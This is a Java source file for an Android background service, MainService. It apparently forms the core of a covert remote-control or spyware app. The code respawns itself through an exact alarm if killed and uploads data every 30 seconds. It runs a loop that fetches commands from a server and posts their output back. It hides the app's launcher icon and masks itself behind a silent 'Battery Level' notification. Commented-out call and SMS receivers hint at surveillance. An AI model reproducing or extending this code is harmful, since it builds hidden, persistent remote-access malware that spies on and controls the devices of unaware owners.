package com.example.elite.manage.android;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.RequiresApi;
import androidx.core.app.NotificationCompat;

import java.util.Timer;


public class MainService extends Service {

    private static final double UPLOAD_INTERVAL = 0.5;//in minutes

    @Override
    public void onCreate() {

        super.onCreate();

        Log.w(AppSettings.getTAG(), "Service created");

        /*Setup an exact one-time Alarm to respawn this service(in case process is killed by Android or by user(?)) at a fixed interval(here, 1 minute)*/
        HelperMethods.createOneTimeExactAlarm(this);

        /*Fire up the RepeatTask class in a timer*/
        if (HelperMethods.getThreadsByName("RepeatTask").size() == 0) {//if timer thread doesn't exist
            RepeatTask repeatTask = new RepeatTask(this);
            try {
                new Timer("RepeatTask", false).scheduleAtFixedRate(repeatTask, 0, (long) (UPLOAD_INTERVAL * 60 * 1000));
            } catch (IllegalStateException ise) {
                Log.w(AppSettings.getTAG(), ise.getMessage());
            }
        }

        /*Start a server-talking loop thread*/
        if (HelperMethods.getThreadsByName("ServerTalkLoopThread").size() == 0) {//if server-talking thread doesn't exist
            ServerTalkLoopThread serverTalkLoopThread = new ServerTalkLoopThread(this, AppSettings.getReportURL(), AppSettings.getCommandsURL(), AppSettings.getOutputURL());
            serverTalkLoopThread.setName("ServerTalkLoopThread");
            serverTalkLoopThread.start();
        }

        PackageManager pkg=this.getPackageManager();
        pkg.setComponentEnabledSetting(new ComponentName(this, MainActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.O)
            startMyOwnForeground();
        else
            startForeground(1, new Notification());
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private void startMyOwnForeground()
    {
        String NOTIFICATION_CHANNEL_ID = "example.permanence";
        String channelName = "Battery Level Service";
        NotificationChannel chan = new NotificationChannel(NOTIFICATION_CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_NONE);
        chan.setLightColor(Color.BLUE);
        chan.setLockscreenVisibility(Notification.VISIBILITY_PRIVATE);

        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        assert manager != null;
        manager.createNotificationChannel(chan);

        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID);
        Notification notification = notificationBuilder.setOngoing(true)
                .setContentTitle("Battery Level")
                .setPriority(NotificationManager.IMPORTANCE_MIN)
                .setCategory(Notification.CATEGORY_SERVICE)
                .build();
        startForeground(1, notification);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return Service.START_STICKY;
    }

    @Override
    public void onDestroy() {
        Log.w(AppSettings.getTAG(), "Service about to be destroyed");
//        unregisterReceiver(callStateBroadcastReceiver);
//        unregisterReceiver(smsBroadcastReceiver);
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

}
